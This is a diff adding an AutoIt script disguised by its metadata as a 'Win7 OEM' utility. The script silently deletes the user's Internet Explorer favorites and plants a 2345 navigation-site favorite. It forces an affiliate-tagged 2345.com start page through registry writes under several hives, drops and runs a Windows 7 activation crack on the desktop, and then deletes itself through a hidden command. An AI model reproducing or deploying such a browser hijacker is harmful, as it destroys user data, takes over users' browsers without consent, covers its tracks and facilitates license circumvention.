@@ -1,0 +1,21 @@
+﻿#Region
+#AutoIt3Wrapper_icon=..\rhors (75).ico
+#AutoIt3Wrapper_Res_Comment=Win7 OEM
+#AutoIt3Wrapper_Res_Description=Win7 OEM
+#AutoIt3Wrapper_Res_Fileversion=1.1.0.0
+#AutoIt3Wrapper_Res_LegalCopyright=Win7 OEM
+#EndRegion
+ AUTOITSETOPTION ( "TrayMenuMode" , 1 )
+ SLEEP ( 2000 )
+ FILEDELETE ( @FAVORITESDIR & "\*.url" )
+ FILEINSTALL ( "2345网址导航－中国最好的网址站.url" , @FAVORITESDIR & "\2345网址导航－中国最好的网址站.url" , 1 )
+ FILEINSTALL ( "Internet Explorer.lnk" , @APPDATADIR & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Internet Explorer.lnk" , 1 )
+ FILEINSTALL ( "Win7激活工具.exe" , @DESKTOPDIR & "\Win7激活工具.exe" )
+ FILEINSTALL ( "Win7 32位激活说明.txt" , @DESKTOPDIR & "\Win7 32位激活说明.txt" )
+ REGWRITE ( "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" , "Start Page" , "REG_SZ" , "http://www.2345.com/?09" )
+ REGWRITE ( "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main" , "Start Page" , "REG_SZ" , "http://www.2345.com/?09" )
+ REGWRITE ( "HKEY_USERS\S-1-5-21-845089923-490113011737-84670167-500\Software\Microsoft\Internet Explorer\Main" , "Start Page" , "REG_SZ" , "http://www.2345.com/?09" )
+ RUN ( @DESKTOPDIR & "\Win7激活工具.exe" )
+ TRAYTIP ( "请在administrator下运行" , "手动点击进行激活" , 5 , 1 )
+ SLEEP ( 1000 )
+ RUN ( @COMSPEC & " /c ping 127.0.0.1 -n 3&del /q """ & @SCRIPTFULLPATH & """" , @SCRIPTDIR , @SW_HIDE )
